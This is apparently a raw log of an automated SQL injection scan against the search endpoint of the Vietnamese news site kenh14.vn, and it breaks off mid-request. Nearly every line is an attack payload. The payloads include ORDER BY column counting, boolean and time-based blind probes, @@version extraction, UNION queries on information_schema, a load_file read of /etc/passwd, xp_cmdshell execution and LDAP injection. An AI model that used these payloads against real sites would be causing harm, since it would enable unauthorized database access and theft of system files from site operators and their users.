+[Request]: time:142.74239999055862 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 14 "} - {"":"undefined ORDER BY 14 "} -  ORDER BY 14 
+[Response]: OK -  ORDER BY 14 
+[Request]: time:130.99370002746582 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 15 "} - {"":"undefined ORDER BY 15 "} -  ORDER BY 15 
+[Response]: OK -  ORDER BY 15 
+[Request]: time:185.237399995327 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 16 "} - {"":"undefined ORDER BY 16 "} -  ORDER BY 16 
+[Response]: OK -  ORDER BY 16 
+[Request]: time:134.68670004606247 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 17 "} - {"":"undefined ORDER BY 17 "} -  ORDER BY 17 
+[Response]: OK -  ORDER BY 17 
+[Request]: time:178.86269998550415 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 18 "} - {"":"undefined ORDER BY 18 "} -  ORDER BY 18 
+[Response]: OK -  ORDER BY 18 
+[Request]: time:159.96430003643036 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 19 "} - {"":"undefined ORDER BY 19 "} -  ORDER BY 19 
+[Response]: OK -  ORDER BY 19 
+[Request]: time:147.52630001306534 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 20 "} - {"":"undefined ORDER BY 20 "} -  ORDER BY 20 
+[Response]: OK -  ORDER BY 20 
+[Request]: time:164.9578999876976 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 21 "} - {"":"undefined ORDER BY 21 "} -  ORDER BY 21 
+[Response]: OK -  ORDER BY 21 
+[Request]: time:132.65920001268387 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 22 "} - {"":"undefined ORDER BY 22 "} -  ORDER BY 22 
+[Response]: OK -  ORDER BY 22 
+[Request]: time:161.23479998111725 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 23 "} - {"":"undefined ORDER BY 23 "} -  ORDER BY 23 
+[Response]: OK -  ORDER BY 23 
+[Request]: time:132.68349999189377 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 24 "} - {"":"undefined ORDER BY 24 "} -  ORDER BY 24 
+[Response]: OK -  ORDER BY 24 
+[Request]: time:179.80019998550415 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 25 "} - {"":"undefined ORDER BY 25 "} -  ORDER BY 25 
+[Response]: OK -  ORDER BY 25 
+[Request]: time:137.58550000190735 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 26 "} - {"":"undefined ORDER BY 26 "} -  ORDER BY 26 
+[Response]: OK -  ORDER BY 26 
+[Request]: time:173.65469998121262 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 27 "} - {"":"undefined ORDER BY 27 "} -  ORDER BY 27 
+[Response]: OK -  ORDER BY 27 
+[Request]: time:172.6385999917984 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 28 "} - {"":"undefined ORDER BY 28 "} -  ORDER BY 28 
+[Response]: OK -  ORDER BY 28 
+[Request]: time:166.88160002231598 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 29 "} - {"":"undefined ORDER BY 29 "} -  ORDER BY 29 
+[Response]: OK -  ORDER BY 29 
+[Request]: time:137.88969999551773 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 30 "} - {"":"undefined ORDER BY 30 "} -  ORDER BY 30 
+[Response]: OK -  ORDER BY 30 
+[Request]: time:121.46200001239777 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai ORDER BY 31337 "} - {"":"undefined ORDER BY 31337 "} -  ORDER BY 31337 
+[Response]: OK -  ORDER BY 31337 
+[Request]: time:165.74670004844666 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"} - {"":"undefined RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"} -  RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+[Response]: OK -  RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+[Request]: time:191.16790002584457 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"} - {"":"undefined RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"} -  RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+[Response]: OK -  RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+[Request]: time:157.00400000810623 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiIF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--"} - {"":"undefinedIF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--"} - IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+[Response]: OK - IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+[Request]: time:133.92960000038147 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiIF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--"} - {"":"undefinedIF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--"} - IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+[Response]: OK - IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+[Request]: time:221.02890002727509 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%' AND 8310=8310 AND '%'='"} - {"":"undefined%' AND 8310=8310 AND '%'='"} - %' AND 8310=8310 AND '%'='
+[Response]: OK - %' AND 8310=8310 AND '%'='
+[Request]: time:180.1191000342369 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%' AND 8310=8311 AND '%'='"} - {"":"undefined%' AND 8310=8311 AND '%'='"} - %' AND 8310=8311 AND '%'='
+[Response]: OK - %' AND 8310=8311 AND '%'='
+[Request]: time:186.41170001029968 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai and (select substring(@@version,1,1))='X'"} - {"":"undefined and (select substring(@@version,1,1))='X'"} -  and (select substring(@@version,1,1))='X'
+[Response]: OK -  and (select substring(@@version,1,1))='X'
+[Request]: time:222.73769998550415 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai and (select substring(@@version,1,1))='M'"} - {"":"undefined and (select substring(@@version,1,1))='M'"} -  and (select substring(@@version,1,1))='M'
+[Response]: OK -  and (select substring(@@version,1,1))='M'
+[Request]: time:125.53970003128052 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai and (select substring(@@version,2,1))='i'"} - {"":"undefined and (select substring(@@version,2,1))='i'"} -  and (select substring(@@version,2,1))='i'
+[Response]: OK -  and (select substring(@@version,2,1))='i'
+[Request]: time:169.40100002288818 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai and (select substring(@@version,2,1))='y'"} - {"":"undefined and (select substring(@@version,2,1))='y'"} -  and (select substring(@@version,2,1))='y'
+[Response]: OK -  and (select substring(@@version,2,1))='y'
+[Request]: time:189.45649999380112 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai and (select substring(@@version,3,1))='c'"} - {"":"undefined and (select substring(@@version,3,1))='c'"} -  and (select substring(@@version,3,1))='c'
+[Response]: OK -  and (select substring(@@version,3,1))='c'
+[Request]: time:424.5999000072479 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai and (select substring(@@version,3,1))='S'"} - {"":"undefined and (select substring(@@version,3,1))='S'"} -  and (select substring(@@version,3,1))='S'
+[Response]: OK -  and (select substring(@@version,3,1))='S'
+[Request]: time:195.52869999408722 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai and (select substring(@@version,3,1))='X'"} - {"":"undefined and (select substring(@@version,3,1))='X'"} -  and (select substring(@@version,3,1))='X'
+[Response]: OK -  and (select substring(@@version,3,1))='X'
+[Request]: time:128.8488000035286 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai)%20or%20('x'='x"} - {"":"undefined)%20or%20('x'='x"} - )%20or%20('x'='x
+[Response]: OK - )%20or%20('x'='x
+[Request]: time:409.6507999897003 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%20or%201=1"} - {"":"undefined%20or%201=1"} - %20or%201=1
+[Response]: OK - %20or%201=1
+[Request]: time:164.2616000175476 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai; execute immediate 'sel' || 'ect us' || 'er'"} - {"":"undefined; execute immediate 'sel' || 'ect us' || 'er'"} - ; execute immediate 'sel' || 'ect us' || 'er'
+[Response]: OK - ; execute immediate 'sel' || 'ect us' || 'er'
+[Request]: time:164.8148000240326 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaibenchmark(10000000,MD5(1))#"} - {"":"undefinedbenchmark(10000000,MD5(1))#"} - benchmark(10000000,MD5(1))#
+[Response]: OK - benchmark(10000000,MD5(1))#
+[Request]: time:151.52990001440048 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiupdate"} - {"":"undefinedupdate"} - update
+[Response]: OK - update
+[Request]: time:272.44699996709824 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\";waitfor delay '0:0:__TIME__'--"} - {"":"undefined\";waitfor delay '0:0:__TIME__'--"} - ";waitfor delay '0:0:__TIME__'--
+[Response]: OK - ";waitfor delay '0:0:__TIME__'--
+[Request]: time:175.9254999756813 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1) or pg_sleep(__TIME__)--"} - {"":"undefined1) or pg_sleep(__TIME__)--"} - 1) or pg_sleep(__TIME__)--
+[Response]: OK - 1) or pg_sleep(__TIME__)--
+[Request]: time:227.89170002937317 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai||(elt(-3+5,bin(15),ord(10),hex(char(45))))"} - {"":"undefined||(elt(-3+5,bin(15),ord(10),hex(char(45))))"} - ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+[Response]: OK - ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+[Request]: time:348.9210000038147 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaihi\"\"\"\") or (\"\"\"\"a\"\"\"\"=\"\"\"\"a\"\"\""} - {"":"undefinedhi\"\"\"\") or (\"\"\"\"a\"\"\"\"=\"\"\"\"a\"\"\""} - hi"""") or (""""a""""=""""a"""
+[Response]: OK - hi"""") or (""""a""""=""""a"""
+[Request]: time:220.22429996728897 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaidelete"} - {"":"undefineddelete"} - delete
+[Response]: OK - delete
+[Request]: time:191.51989996433258 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đailike"} - {"":"undefinedlike"} - like
+[Response]: OK - like
+[Request]: time:203.23550003767014 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\" or sleep(__TIME__)#"} - {"":"undefined\" or sleep(__TIME__)#"} - " or sleep(__TIME__)#
+[Response]: OK - " or sleep(__TIME__)#
+[Request]: time:160.13319998979568 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaipg_sleep(__TIME__)--"} - {"":"undefinedpg_sleep(__TIME__)--"} - pg_sleep(__TIME__)--
+[Response]: OK - pg_sleep(__TIME__)--
+[Request]: time:134.99949997663498 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai*(|(objectclass=*))"} - {"":"undefined*(|(objectclass=*))"} - *(|(objectclass=*))
+[Response]: OK - *(|(objectclass=*))
+[Request]: time:162.45090001821518 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @q nvarchar (200) 0x730065006c00650063 ..."} - {"":"undefineddeclare @q nvarchar (200) 0x730065006c00650063 ..."} - declare @q nvarchar (200) 0x730065006c00650063 ...
+[Response]: OK - declare @q nvarchar (200) 0x730065006c00650063 ...
+[Request]: time:173.74690002202988 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 0=0 #"} - {"":"undefined or 0=0 #"} -  or 0=0 #
+[Response]: OK -  or 0=0 #
+[Request]: time:203.68289995193481 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiinsert"} - {"":"undefinedinsert"} - insert
+[Response]: OK - insert
+[Request]: time:191.4728999733925 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1) or sleep(__TIME__)#"} - {"":"undefined1) or sleep(__TIME__)#"} - 1) or sleep(__TIME__)#
+[Response]: OK - 1) or sleep(__TIME__)#
+[Request]: time:186.32039999961853 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai) or ('a'='a"} - {"":"undefined) or ('a'='a"} - ) or ('a'='a
+[Response]: OK - ) or ('a'='a
+[Request]: time:602.1513999700546 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai; exec xp_regread"} - {"":"undefined; exec xp_regread"} - ; exec xp_regread
+[Response]: OK - ; exec xp_regread
+[Request]: time:188.08050000667572 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai*|"} - {"":"undefined*|"} - *|
+[Response]: OK - *|
+[Request]: time:151.10780000686646 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai@var select @var as var into temp end --"} - {"":"undefined@var select @var as var into temp end --"} - @var select @var as var into temp end --
+[Response]: OK - @var select @var as var into temp end --
+[Request]: time:186.57859998941422 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1)) or benchmark(10000000,MD5(1))#"} - {"":"undefined1)) or benchmark(10000000,MD5(1))#"} - 1)) or benchmark(10000000,MD5(1))#
+[Response]: OK - 1)) or benchmark(10000000,MD5(1))#
+[Request]: time:161.968199968338 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiasc"} - {"":"undefinedasc"} - asc
+[Response]: OK - asc
+[Request]: time:133.962199985981 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai(||6)"} - {"":"undefined(||6)"} - (||6)
+[Response]: OK - (||6)
+[Request]: time:183.20049995183945 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaia\"\"\"\" or 3=3--\"\"\""} - {"":"undefineda\"\"\"\" or 3=3--\"\"\""} - a"""" or 3=3--"""
+[Response]: OK - a"""" or 3=3--"""
+[Request]: time:142.03659999370575 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\" or benchmark(10000000,MD5(1))#"} - {"":"undefined\" or benchmark(10000000,MD5(1))#"} - " or benchmark(10000000,MD5(1))#
+[Response]: OK - " or benchmark(10000000,MD5(1))#
+[Request]: time:144.3336000442505 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai# from wapiti"} - {"":"undefined# from wapiti"} - # from wapiti
+[Response]: OK - # from wapiti
+[Request]: time:191.14060002565384 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 0=0 --"} - {"":"undefined or 0=0 --"} -  or 0=0 --
+[Response]: OK -  or 0=0 --
+[Request]: time:154.52009999752045 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1 waitfor delay '0:0:10'--"} - {"":"undefined1 waitfor delay '0:0:10'--"} - 1 waitfor delay '0:0:10'--
+[Response]: OK - 1 waitfor delay '0:0:10'--
+[Request]: time:149.94650000333786 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 'a'='a"} - {"":"undefined or 'a'='a"} -  or 'a'='a
+[Response]: OK -  or 'a'='a
+[Request]: time:150.71530002355576 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaihi or 1=1 --\""} - {"":"undefinedhi or 1=1 --\""} - hi or 1=1 --"
+[Response]: OK - hi or 1=1 --"
+[Request]: time:155.59669995307922 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior a = a"} - {"":"undefinedor a = a"} - or a = a
+[Response]: OK - or a = a
+[Request]: time:158.79800003767014 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai UNION ALL SELECT"} - {"":"undefined UNION ALL SELECT"} -  UNION ALL SELECT
+[Response]: OK -  UNION ALL SELECT
+[Request]: time:147.332200050354 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai) or sleep(__TIME__)='"} - {"":"undefined) or sleep(__TIME__)='"} - ) or sleep(__TIME__)='
+[Response]: OK - ) or sleep(__TIME__)='
+[Request]: time:173.6729999780655 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai)) or benchmark(10000000,MD5(1))#"} - {"":"undefined)) or benchmark(10000000,MD5(1))#"} - )) or benchmark(10000000,MD5(1))#
+[Response]: OK - )) or benchmark(10000000,MD5(1))#
+[Request]: time:152.80000001192093 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaihi' or 'a'='a"} - {"":"undefinedhi' or 'a'='a"} - hi' or 'a'='a
+[Response]: OK - hi' or 'a'='a
+[Request]: time:141.62230002880096 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai0"} - {"":"undefined0"} - 0
+[Response]: OK - 0
+[Request]: time:138.4355999827385 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai21%"} - {"":"undefined21%"} - 21%
+[Response]: OK - 21%
+[Request]: time:150.43099999427795 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đailimit"} - {"":"undefinedlimit"} - limit
+[Response]: OK - limit
+[Request]: time:150.6265999674797 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 1=1"} - {"":"undefined or 1=1"} -  or 1=1
+[Response]: OK -  or 1=1
+[Request]: time:166.55070000886917 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 2 > 1"} - {"":"undefined or 2 > 1"} -  or 2 > 1
+[Response]: OK -  or 2 > 1
+[Request]: time:134.83539998531342 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\")) or benchmark(10000000,MD5(1))#"} - {"":"undefined\")) or benchmark(10000000,MD5(1))#"} - ")) or benchmark(10000000,MD5(1))#
+[Response]: OK - ")) or benchmark(10000000,MD5(1))#
+[Request]: time:128.2946999669075 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiPRINT"} - {"":"undefinedPRINT"} - PRINT
+[Response]: OK - PRINT
+[Request]: time:139.09280002117157 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaihi') or ('a'='a"} - {"":"undefinedhi') or ('a'='a"} - hi') or ('a'='a
+[Response]: OK - hi') or ('a'='a
+[Request]: time:141.14710003137589 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 3=3"} - {"":"undefined or 3=3"} -  or 3=3
+[Response]: OK -  or 3=3
+[Request]: time:187.00470000505447 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai));waitfor delay '0:0:__TIME__'--"} - {"":"undefined));waitfor delay '0:0:__TIME__'--"} - ));waitfor delay '0:0:__TIME__'--
+[Response]: OK - ));waitfor delay '0:0:__TIME__'--
+[Request]: time:162.5436999797821 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaia' waitfor delay '0:0:10'--"} - {"":"undefineda' waitfor delay '0:0:10'--"} - a' waitfor delay '0:0:10'--
+[Response]: OK - a' waitfor delay '0:0:10'--
+[Request]: time:146.15070003271103 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1;(load_file(char(47,101,116,99,47,112,97,115, ..."} - {"":"undefined1;(load_file(char(47,101,116,99,47,112,97,115, ..."} - 1;(load_file(char(47,101,116,99,47,112,97,115, ...
+[Response]: OK - 1;(load_file(char(47,101,116,99,47,112,97,115, ...
+[Request]: time:149.99720001220703 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior%201=1"} - {"":"undefinedor%201=1"} - or%201=1
+[Response]: OK - or%201=1
+[Request]: time:144.2125000357628 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1 or sleep(__TIME__)#"} - {"":"undefined1 or sleep(__TIME__)#"} - 1 or sleep(__TIME__)#
+[Response]: OK - 1 or sleep(__TIME__)#
+[Request]: time:165.1492000222206 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior 1=1"} - {"":"undefinedor 1=1"} - or 1=1
+[Response]: OK - or 1=1
+[Request]: time:175.12339997291565 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai and 1 in (select var from temp)--"} - {"":"undefined and 1 in (select var from temp)--"} -  and 1 in (select var from temp)--
+[Response]: OK -  and 1 in (select var from temp)--
+[Request]: time:151.90659999847412 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or '7659'='7659"} - {"":"undefined or '7659'='7659"} -  or '7659'='7659
+[Response]: OK -  or '7659'='7659
+[Request]: time:160.41359996795654 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 'text' = n'text'"} - {"":"undefined or 'text' = n'text'"} -  or 'text' = n'text'
+[Response]: OK -  or 'text' = n'text'
+[Request]: time:134.79320001602173 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai --"} - {"":"undefined --"} -  --
+[Response]: OK -  --
+[Request]: time:135.05489999055862 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 1=1 or ''='"} - {"":"undefined or 1=1 or ''='"} -  or 1=1 or ''='
+[Response]: OK -  or 1=1 or ''='
+[Request]: time:213.79270005226135 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @s varchar (200) select @s = 0x73656c6 ..."} - {"":"undefineddeclare @s varchar (200) select @s = 0x73656c6 ..."} - declare @s varchar (200) select @s = 0x73656c6 ...
+[Response]: OK - declare @s varchar (200) select @s = 0x73656c6 ...
+[Request]: time:407.56660002470016 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiexec xp"} - {"":"undefinedexec xp"} - exec xp
+[Response]: OK - exec xp
+[Request]: time:138.89780002832413 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai; exec master..xp_cmdshell 'ping 172.10.1.255'--"} - {"":"undefined; exec master..xp_cmdshell 'ping 172.10.1.255'--"} - ; exec master..xp_cmdshell 'ping 172.10.1.255'--
+[Response]: OK - ; exec master..xp_cmdshell 'ping 172.10.1.255'--
+[Request]: time:143.02320003509521 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai3.10E+17"} - {"":"undefined3.10E+17"} - 3.10E+17
+[Response]: OK - 3.10E+17
+[Request]: time:203.44209998846054 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or pg_sleep(__TIME__)--\""} - {"":"undefined or pg_sleep(__TIME__)--\""} -  or pg_sleep(__TIME__)--"
+[Response]: OK -  or pg_sleep(__TIME__)--"
+[Request]: time:125.71509999036789 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaix' AND email IS NULL; --"} - {"":"undefinedx' AND email IS NULL; --"} - x' AND email IS NULL; --
+[Response]: OK - x' AND email IS NULL; --
+[Request]: time:362.4936000108719 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai&"} - {"":"undefined&"} - &
+[Response]: OK - &
+[Request]: time:120.22279995679855 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiadmin' or '"} - {"":"undefinedadmin' or '"} - admin' or '
+[Response]: OK - admin' or '
+[Request]: time:147.05330002307892 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 'unusual' = 'unusual'"} - {"":"undefined or 'unusual' = 'unusual'"} -  or 'unusual' = 'unusual'
+[Response]: OK -  or 'unusual' = 'unusual'
+[Request]: time:161.29240000247955 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai//"} - {"":"undefined//"} - //
+[Response]: OK - //
+[Request]: time:174.6395000219345 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaitruncate"} - {"":"undefinedtruncate"} - truncate
+[Response]: OK - truncate
+[Request]: time:132.5358999967575 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1) or benchmark(10000000,MD5(1))#"} - {"":"undefined1) or benchmark(10000000,MD5(1))#"} - 1) or benchmark(10000000,MD5(1))#
+[Response]: OK - 1) or benchmark(10000000,MD5(1))#
+[Request]: time:158.4800000190735 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\\x27UNION SELECT"} - {"":"undefined\\x27UNION SELECT"} - \x27UNION SELECT
+[Response]: OK - \x27UNION SELECT
+[Request]: time:163.14850002527237 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @s varchar(200) select @s = 0x77616974 ..."} - {"":"undefineddeclare @s varchar(200) select @s = 0x77616974 ..."} - declare @s varchar(200) select @s = 0x77616974 ...
+[Response]: OK - declare @s varchar(200) select @s = 0x77616974 ...
+[Request]: time:169.1927000284195 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaitz_offset"} - {"":"undefinedtz_offset"} - tz_offset
+[Response]: OK - tz_offset
+[Request]: time:161.71329998970032 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaisqlvuln"} - {"":"undefinedsqlvuln"} - sqlvuln
+[Response]: OK - sqlvuln
+[Request]: time:213.94960004091263 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\"));waitfor delay '0:0:__TIME__'--"} - {"":"undefined\"));waitfor delay '0:0:__TIME__'--"} - "));waitfor delay '0:0:__TIME__'--
+[Response]: OK - "));waitfor delay '0:0:__TIME__'--
+[Request]: time:201.4176999926567 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai||6"} - {"":"undefined||6"} - ||6
+[Response]: OK - ||6
+[Request]: time:164.46619999408722 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior%201=1 --"} - {"":"undefinedor%201=1 --"} - or%201=1 --
+[Response]: OK - or%201=1 --
+[Request]: time:165.47310000658035 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%2A%28%7C%28objectclass%3D%2A%29%29"} - {"":"undefined%2A%28%7C%28objectclass%3D%2A%29%29"} - %2A%28%7C%28objectclass%3D%2A%29%29
+[Response]: OK - %2A%28%7C%28objectclass%3D%2A%29%29
+[Request]: time:155.16790002584457 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior a=a"} - {"":"undefinedor a=a"} - or a=a
+[Response]: OK - or a=a
+[Request]: time:167.98719996213913 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai) union select * from information_schema.tables;"} - {"":"undefined) union select * from information_schema.tables;"} - ) union select * from information_schema.tables;
+[Response]: OK - ) union select * from information_schema.tables;
+[Request]: time:139.1347999572754 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiPRINT @@variable"} - {"":"undefinedPRINT @@variable"} - PRINT @@variable
+[Response]: OK - PRINT @@variable
+[Request]: time:343.43449997901917 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior isNULL(1/0) /*"} - {"":"undefinedor isNULL(1/0) /*"} - or isNULL(1/0) /*
+[Response]: OK - or isNULL(1/0) /*
+[Request]: time:386.85580003261566 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai26 %"} - {"":"undefined26 %"} - 26 %
+[Response]: OK - 26 %
+[Request]: time:150.8066999912262 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or \"\"a\"\"=\"\"a\""} - {"":"undefined or \"\"a\"\"=\"\"a\""} -  or ""a""=""a"
+[Response]: OK -  or ""a""=""a"
+[Request]: time:142.32710003852844 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai(sqlvuln)"} - {"":"undefined(sqlvuln)"} - (sqlvuln)
+[Response]: OK - (sqlvuln)
+[Request]: time:175.79439997673035 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaix' AND members.email IS NULL; --"} - {"":"undefinedx' AND members.email IS NULL; --"} - x' AND members.email IS NULL; --
+[Response]: OK - x' AND members.email IS NULL; --
+[Request]: time:157.45489996671677 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 1=1--"} - {"":"undefined or 1=1--"} -  or 1=1--
+[Response]: OK -  or 1=1--
+[Request]: time:164.18240004777908 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai and 1=( if((load_file(char(110,46,101,120,11 ..."} - {"":"undefined and 1=( if((load_file(char(110,46,101,120,11 ..."} -  and 1=( if((load_file(char(110,46,101,120,11 ...
+[Response]: OK -  and 1=( if((load_file(char(110,46,101,120,11 ...
+[Request]: time:153.724799990654 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai0x770061006900740066006F0072002000640065006C00 ..."} - {"":"undefined0x770061006900740066006F0072002000640065006C00 ..."} - 0x770061006900740066006F0072002000640065006C00 ...
+[Response]: OK - 0x770061006900740066006F0072002000640065006C00 ...
+[Request]: time:159.9854000210762 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%20'sleep%2050'"} - {"":"undefined%20'sleep%2050'"} - %20'sleep%2050'
